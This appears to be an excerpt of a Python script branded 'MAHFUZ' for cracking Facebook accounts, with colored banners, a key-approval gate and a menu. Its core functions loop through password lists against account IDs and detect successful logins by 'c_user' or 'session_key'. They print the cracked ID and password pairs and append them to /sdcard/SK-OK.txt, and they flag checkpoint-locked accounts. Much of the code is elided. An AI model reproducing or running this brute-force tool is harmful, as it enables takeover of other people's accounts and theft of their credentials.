...
\33[1;97m 
  ...
  \33[;97m
=======================================================
\033[;37m\033[;97m         Facebook       \033[;37m\033[;92m  : Md Mahfuz Hasan 
...
def approval():
  ...
  try:
    ...
    if id in httpCaht:
      ...
      print("\33[1;97m----------------------------------------------")
      print("\33[1;97mFirst Join.......  Group ")
      print('Copy Key and send MAHFUZ Owner')
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system(f'xdg-open https://www.facebook.com/mdmahfujhasan.joy/{wx}');menu()
                        elif xd in ['7','07']:
                                os.system('xdg-open https://www.facebook.com/mdmahfujhasan.joy/');menu()
                        elif xd in ['8','08']:
                                os.system('xdg-open https://www.facebook.com/mdmahfujhasan.joy/');menu()
                        elif xd in ['0','00']:
                                exit(' Thanks for use ')
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Sk:
                                ...
                                print('\r\r\033[1;32m MAHFUZ-OK %s | %s'%(ids,pas))
                                open('/sdcard/SK-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Sk:
                                if 'y' in pcp:
                                        print('\r\033[1;97m MAHFUZ-CP '+ids+' | '+pas+'\033[1;97m')
...
def api(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;97m [Process] %s|\033[1;32mMAHFUZ:-%s \033[1;97m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m MAHFUZ-OK '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/SK-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
...
def api1(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32mMAHFUZ-OK '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/SK-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                                ...
                                if 'session_key' in q:
                                        ...
                                        try:
                                                ...
                                                if uid in okk:pass
                                                        ...
                                                        print('\r\r\033[1;32m MAHFUZ-OK '+uid+' | '+pas+'\033[1;97m')
